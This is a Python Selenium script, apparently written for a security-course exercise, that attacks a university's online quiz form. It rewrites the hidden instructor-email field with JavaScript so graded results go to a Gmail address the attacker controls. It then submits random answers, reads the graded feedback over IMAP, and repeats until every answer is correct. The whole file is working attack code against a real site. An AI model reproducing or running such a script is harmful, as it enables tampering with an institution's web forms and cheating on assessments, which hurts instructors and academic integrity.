import random
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import Select
import time
import imaplib
import email
from bs4 import BeautifulSoup
import re
from datetime import datetime

# Set up the web driver (Chrome in this case) to automate browser interactions
driver = webdriver.Chrome(executable_path='C:\\Users\\calik\\IdeaProjects\\Hacking_Quiz_1\\chromedriver.exe')

# Define possible answer choices for each quiz question
answer_choices = {
    'q1': ['T', 'F'],  # True/False for question 1
    'q2': ['T', 'F'],  # True/False for question 2
    'q3': ['A', 'B', 'C', 'D', 'E', 'F'],  # Multiple choices for question 3
    'q4': ['A', 'B', 'C', 'D', 'E', 'F'],
    'q5': ['A', 'B', 'C', 'D', 'E', 'F'],
    'q6': ['A', 'B', 'C', 'D', 'E', 'F'],
    'q7': ['A', 'B', 'C', 'D', 'E', 'F'],
    'q8': ['A', 'B', 'C', 'D', 'E', 'F'],
    'q9': ['A', 'B', 'C', 'D'],
    'q10': ['A', 'B', 'C', 'D']
}

# Dictionary to store correct answers as they are identified
correct_answers = {}
incorrect_answers = [1, 2, 3, 4, 5, 6, 7, 8, 9, 10]  # Initialize with all questions being incorrect initially
# Connect to Gmail using IMAP to extract quiz results
def connect_to_gmail():
    mail = imaplib.IMAP4_SSL('imap.gmail.com')  # Secure connection to Gmail
    mail.login('user@gmail.com', 'password')  # Login using your credentials
    mail.select('inbox')  # Select the inbox folder
    return mail

# Fetch the latest email from the quiz system and extract feedback on answers
def fetch_latest_email(mail, last_email_id=None):
    max_attempts = 10  # Limit attempts to avoid an infinite loop
    attempt = 0
    email_message = None
    today = datetime.today().strftime("%d-%b-%Y")  # Get today's date in the required IMAP format

    # Attempt to fetch the latest email up to max_attempts
    while attempt < max_attempts:
        print(f"Attempt {attempt + 1} to fetch email...")  # Debugging log

        mail.noop()  # Force the server to synchronize and check for new emails
        status, data = mail.search(None, f'(FROM "score@score.examview.com" SINCE {today})')  # Search for emails from the quiz system today

        print(f"Search Status: {status}")
        print(f"Email IDs: {data[0]}")  # Debugging log for email IDs found

        email_ids = data[0].split()  # Split the result into individual email IDs

        if email_ids:
            # Check if there is a new email to process (higher ID than the last one)
            if last_email_id is None or int(email_ids[-1]) > int(last_email_id):
                latest_email_id = email_ids[-1]  # Get the latest email ID
                status, email_data = mail.fetch(latest_email_id, '(RFC822)')  # Fetch the email content

                # Ensure data is fetched correctly
                if status == 'OK' and len(email_data[0]) > 1:
                    if isinstance(email_data[0][1], bytes):
                        email_message = email.message_from_bytes(email_data[0][1])  # Convert to email format
                        return email_message, latest_email_id  # Return the latest email and ID
                    else:
                        print("Warning: Fetched data is not in the expected format.")
                else:
                    print("Failed to fetch the full email content.")
            else:
                print("No new emails found yet. Retrying...")
        else:
            print("No email found yet. Retrying...")

        attempt += 1
        time.sleep(10)  # Wait before retrying

    return None, last_email_id  # Return None if no new email is found after all attempts

# Parse the email and extract feedback on which questions were correct or incorrect
def parse_email_for_feedback(email_message):
    # Iterate through the parts of the email to find the correct content type (text/plain or text/html)
    for part in email_message.walk():
        if part.get_content_type() == 'text/plain':
            email_body = part.get_payload(decode=True).decode()  # Extract plain text content
            break
        elif part.get_content_type() == 'text/html':
            html_body = part.get_payload(decode=True).decode()  # Extract HTML content
            soup = BeautifulSoup(html_body, 'html.parser')  # Parse HTML using BeautifulSoup
            email_body = soup.get_text()  # Extract only the text content
            break
    return email_body  # Return the extracted email body

# Extract incorrect and correct answers from the email body
def extract_feedback(email_body):
    incorrect_answers = []
    correct_answers_this_attempt = {}

    # Split email body into lines to process each one individually
    lines = email_body.splitlines()

    for line in lines:
        print(f"Processing line: {line}")  # Debugging log

        # Regular expression to identify lines with question number and selected answer
        match = re.match(r'(X\s*)?\s*(\d+)\.\s+([A-Z])', line)
        if match:
            is_incorrect = bool(match.group(1))  # 'X' indicates an incorrect answer
            question_num = int(match.group(2))  # Question number
            selected_answer = match.group(3)  # The answer selected (A, B, C, etc.)

            if is_incorrect:
                incorrect_answers.append(question_num)  # Add to incorrect list
            else:
                correct_answers_this_attempt[question_num] = selected_answer  # Add to correct answers list

    print(f"Incorrect answers: {incorrect_answers}")  # Debugging log
    print(f"Correct answers this attempt: {correct_answers_this_attempt}")  # Debugging log

    return incorrect_answers, correct_answers_this_attempt

# Generate a guess for all questions using known correct answers and random guesses for the rest
def generate_guess():
    guess = {}
    for q_num in range(1, 11):  # Loop through questions 1 to 10
        if q_num in correct_answers:
            guess[q_num] = correct_answers[q_num]  # Use the known correct answer if available
        else:
            guess[q_num] = random.choice(answer_choices[f'q{q_num}'])  # Make a random guess for unanswered questions
    return guess

# Submit the generated answers to the quiz
def submit_answers(answers_to_submit):
    driver.get("https://faculty.uca.edu/vparuchuri/4315/4315_quiz1.htm")  # Open the quiz page
    time.sleep(3)

    # Fill out the student's details
    driver.find_element(By.NAME, 'student_name').send_keys('test')
    driver.find_element(By.NAME, "student_id").send_keys('1234567')
    driver.find_element(By.NAME, 'student_email').send_keys('test@test.com')

    # Modify the hidden instructor email field using JavaScript to ensure results are sent to you
    email_js = "document.getElementsByName('instructor_email')[0].setAttribute('value', 'test103352@gmail.com');"
    driver.execute_script(email_js)
    time.sleep(1)

    # Submit answers for each question
    for question_num in range(1, 11):
        question_type = 'TF' if question_num <= 2 else 'MC'  # Identify question type (True/False or Multiple Choice)
        answer_to_use = answers_to_submit.get(question_num, '')  # Get the guessed answer

        if answer_to_use:
            q_dropdown = Select(driver.find_element(By.NAME, f'{question_type}:{question_num}'))  # Find the dropdown
            q_dropdown.select_by_visible_text(answer_to_use)  # Select the guessed answer

    # Click the "Grade and Submit" button to submit the quiz
    driver.find_element(By.XPATH, "//input[@alt='Grade and Submit']").click()
    time.sleep(2)

    # Handle potential pop-up with a "Proceed" button
    try:
        send_anyway_button = driver.find_element(By.ID, "proceed-button")
        driver.execute_script("arguments[0].click();", send_anyway_button)
        time.sleep(2)
    except:
        pass

# Brute force the quiz by trying random guesses and refining the answer space with each attempt
def brute_force_quiz():
    global incorrect_answers
    global correct_answers
    mail = connect_to_gmail()  # Connect to Gmail

    last_email_id = None  # Track the last processed email ID

    while incorrect_answers:  # Continue as long as there are incorrect answers
        current_guess = generate_guess()  # Generate a new guess for all questions
        time.sleep(5)

        submit_answers(current_guess)  # Submit the guessed answers
        time.sleep(10)  # Wait for the email feedback to arrive

        mail_message, last_email_id = fetch_latest_email(mail, last_email_id)  # Fetch the latest email

        if mail_message is None:
            print("Failed to fetch email after multiple attempts.")
            break

        mail_body = parse_email_for_feedback(mail_message)  # Parse the email for feedback

        # Extract new incorrect and correct answers from the email
        new_incorrect_answers, correct_answers_this_attempt = extract_feedback(mail_body)

        correct_answers.update(correct_answers_this_attempt)  # Update the correct answers list

        incorrect_answers = new_incorrect_answers  # Update the incorrect answers list

        if not incorrect_answers:
            print("All questions answered correctly!")
            break
        else:
            print("Current correct answers: ", correct_answers)

# Start brute-forcing the quiz
brute_force_quiz()
